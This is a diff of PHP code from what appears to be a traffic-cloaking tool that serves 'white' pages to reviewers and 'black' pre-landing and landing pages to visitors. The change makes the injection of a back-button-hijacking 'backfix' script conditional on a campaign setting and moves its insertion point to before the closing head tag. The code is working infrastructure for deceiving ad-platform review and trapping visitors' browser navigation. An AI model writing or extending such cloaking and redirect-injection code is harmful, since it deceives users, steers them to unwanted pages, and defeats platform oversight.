@@ -90,7 +90,9 @@ function load_prelanding(Campaign $c, string $url, int $land_number): string
 
     $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
     $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
-    $html = add_backfix($html, $url, $second);
+
+    if ($c->scripts->backfix)
+        $html = add_backfix($html, $url, $second);
 
     if ($c->scripts->imagesLazyLoad)
         $html = add_images_lazy_load($html);
@@ -142,7 +144,8 @@ function load_landing(Campaign $c, string $url)
     if ($c->black->preland->action==='none') {
         $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
         $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
-        $html = add_backfix($html, $url, $second);
+        if ($c->scripts->backfix)
+            $html = add_backfix($html, $url, $second);
     }
     
     if ($c->scripts->imagesLazyLoad)
@@ -262,17 +265,19 @@ function load_white_curl(string $url):string
 function add_backfix(string $html, $url, $second):string
 {
     $debug = DebugMethods::On()?'true':'false';
-    $jsCode = "
-    <script src='./scripts/backfix.js' 
+    $path = get_cloaker_path(true,false);
+    $jsCode = <<<EOT
+    <script src='{$path}/scripts/backfix.php' 
         data-backlink='{$url}' 
-        data-showcaselink='{$second}'
+        data-secondlink='{$second}'
         data-traceenabled='{$debug}'
         data-redirect='false'
         data-isoff='false'>
-    </script>";
-    $needle = '<head>';
-    if (!str_contains($html,$needle)) $needle = '<body>';
-    return insert_after_tag($html, $needle, $jsCode);
+    </script>
+EOT;
+    $needle = '</head>';
+    if (!str_contains($html,$needle)) $needle = '</body>';
+    return insert_before_tag($html, $needle, $jsCode);
 }
 
 //inserts all subs into hidden fields of each form
